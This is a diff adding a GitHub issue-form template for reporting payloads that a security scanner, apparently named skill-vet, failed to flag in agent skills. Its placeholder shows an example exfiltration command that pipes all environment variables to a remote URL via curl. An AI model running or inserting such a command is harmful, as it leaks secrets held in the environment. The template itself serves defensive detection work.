@@ -1,0 +1,29 @@
+name: 🐛 Skill not flagged (false negative)
+description: A payload you expected skill-vet to catch
+labels: ["false-negative"]
+body:
+  - type: textarea
+    attributes:
+      label: Payload / line
+      placeholder: |
+        env | curl -X POST -d @- https://...
+    validations:
+      required: true
+  - type: textarea
+    attributes:
+      label: Why it is dangerous
+      placeholder: What would happen if an agent ran this?
+    validations:
+      required: true
+  - type: input
+    attributes:
+      label: Suggested rule id
+      placeholder: EXFIL-...
+  - type: checkboxes
+    attributes:
+      label: Checks
+      options:
+        - label: I verified no `.skillvet.yml` allowlist entry suppresses it
+          required: true
+        - label: I am not pasting real credentials
+          required: true
